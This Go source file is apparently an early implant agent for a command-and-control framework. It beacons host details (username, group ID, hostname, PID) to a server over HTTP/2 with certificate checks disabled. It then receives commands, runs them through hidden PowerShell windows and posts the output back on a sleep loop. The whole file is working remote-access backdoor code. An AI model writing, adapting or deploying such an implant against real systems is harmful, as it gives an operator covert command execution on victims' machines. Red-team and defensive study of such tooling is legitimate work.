package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"time"
	"github.com/fatih/color"
	"github.com/satori/go.uuid"
	"golang.org/x/net/http2"
	"os/exec"
	"syscall"
	"../standard/messages"
	"flag"
)

//GLOBAL VARIABLES
var DEBUG = true
var VERBOSE = true
var RUN = true
var hostUUID = uuid.NewV4()
var url = "https://127.0.0.1:443/"
var h2Client = getH2WebClient()
var waitTime = 10000 * time.Millisecond
const agentVersion = "0.1 Beta"

func main() {

	flag.BoolVar(&VERBOSE, "v", false, "Enable verbose output")
	flag.BoolVar(&DEBUG, "debug", false, "Enable debug output")
	flag.StringVar(&url, "url", "https://127.0.0.1:443", "Full URL for agent to connect to")
	flag.DurationVar(&waitTime, "sleep", 10000 * time.Millisecond, "Time for agent to sleep")
	flag.Usage = usage
	flag.Parse()

	//Perform Initial Check in
	initialCheckIn(url, h2Client)

	for RUN {
		//Sleep then check in
		if VERBOSE {
			color.Yellow("[-]Agent version: %s", agentVersion)
			color.Yellow("[-]Sleeping for %s", waitTime.String())
		}
		time.Sleep(waitTime)
		if VERBOSE {
			color.Yellow("[-]Checking in")
		}
		statusCheckIn(url, h2Client)
	}

}

func initialCheckIn(host string, client *http.Client) {
	u, _ := user.Current()
	h, _ := os.Hostname()

	if VERBOSE {
		color.Green("[+]Host Information:")
		color.Green("\tUser Name: %s", u.Username)
		color.Green("\tUser GUID: %s", u.Gid)
		color.Green("\tHostname: %s", h)
		color.Green("\tPID: %d", os.Getpid())
	}

	//JSON "initial" payload object
	i := messages.SysInfo{
		UserName: u.Username,
		UserGUID: u.Gid,
		HostName: h,
		Pid: os.Getpid(),
	}

	payload, _ := json.Marshal(i)

	//JSON message to be sent to the server
	g := messages.Base{
		Version: 1.0,
		ID:      hostUUID,
		Type:    "InitialCheckIn", //Can set this to a constant in messages.go
		Payload: (*json.RawMessage)(&payload),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)
	color.Yellow("[-]Connecting to web server at %s for initial check in.", host)
	resp, _ := client.Post(host, "application/json; charset=utf-8", b)

	if DEBUG {
		color.Red("[DEBUG]HTTP Response:")
		color.Red("[DEBUG]%s", resp)
	}
}

func statusCheckIn(host string, client *http.Client) {
	g := messages.Base{
		Version: 1.0,
		ID:      hostUUID,
		Type:    "StatusCheckIn",
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)

	if VERBOSE {
		color.Yellow("[-]Connecting to web server at %s for status check in.", host)
	}

	resp, _ := client.Post(host, "application/json; charset=utf-8", b)

	if DEBUG {
		color.Red("%s", "[DEBUG]HTTP Response:")
		color.Red("%s", resp)
		color.Red("ContentLength: %d", resp.ContentLength)
	}

	if resp.ContentLength > 0 {
		//var j messages.Base
		//json.NewDecoder(resp.Body).Decode(&j)
		//http://eagain.net/articles/go-dynamic-json/
		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}
		json.NewDecoder(resp.Body).Decode(&j)

		if DEBUG {
			color.Red("[DEBUG]Agent ID: %s", j.ID)
			color.Red("[DEBUG]Message Type: %s", j.Type)
			color.Red("[DEBUG]Message Payload: %s", j.Payload)
		} else if VERBOSE {
			color.Green("%s Message Type Recieved!", j.Type)
		}
		switch j.Type{
		case "CmdPayload":
			var p messages.CmdPayload
			json.Unmarshal(payload, &p)
			result := executeCommand(p)

			c := messages.PSResults{
				Job: p.Job,
				Result: result,
			}

			k, _ := json.Marshal(c)
			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "PSResults",
				Payload: (*json.RawMessage)(&k),
			}
			b2 := new(bytes.Buffer)
			json.NewEncoder(b2).Encode(g)
			if VERBOSE {
				color.Yellow("Sending response to server: %s", result)
			}
			resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
			if resp2.StatusCode != 200 {
				color.Red("Message error from server. HTTP Status code: %d", resp2.StatusCode)
			}
		case "ServerOk":
			if VERBOSE {
				color.Yellow("[-]Recieved Server OK, doing nothing")
			}
		case "AgentControl":
			if VERBOSE {
				color.Yellow("[-]Recieved Agent Control Message")
			}
			var p messages.AgentControl
			json.Unmarshal(payload, &p)

			if p.Command == "kill" {
				if VERBOSE {
					color.Yellow("[-]Recieved Agent Kill Message")
				}
				os.Exit(1)
			}
		default:
			color.Red("Recieved unrecognized message type: %s", j.Type)
		}
	}
}

func getH2WebClient() *http.Client {

	//Setup TLS Configuration
	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion:               tls.VersionTLS12,
			InsecureSkipVerify:       true,
			PreferServerCipherSuites: false,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			},
			NextProtos: []string{"h2"},
		},
		DisableCompression: false,
	}

	//Setup HTTP Client Configuration
	client := &http.Client{
		Transport: tr,
	}
	return client
}

func executeCommand(j messages.CmdPayload) string{
	if DEBUG {
		color.Red("[DEBUG]Recieved input parameter for executeCommand function: %s", j)

	} else if VERBOSE {
		color.Green("Executing command cmd.exe /c %s", j.Command)
	}

	//cmd := exec.Command("cmd.exe", "/c", j.Command)
	cmd := exec.Command("powershell.exe", "-nop", "-w", "hidden", "-c", j.Command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, _ := cmd.Output();
	if VERBOSE {
		color.Green("Command output:\r\n\r\n%s", out)
	}
	return string(out)
	//sendResult(j)
}

func usage() {
    fmt.Fprintf(os.Stderr, "usage: go run client -v -debug\n")
    flag.PrintDefaults()
    os.Exit(2)
}

/*

1. POST System Enumeration Information and receive back JSON object w/ additional instructions
2. Sleep
3. Check in w/ Server
4. Execute commands if provided by server
5. Return results to server
6. Sleep and Check In
*/

// TODO add error checking for when server can't be reached
// TODO add cert stapling
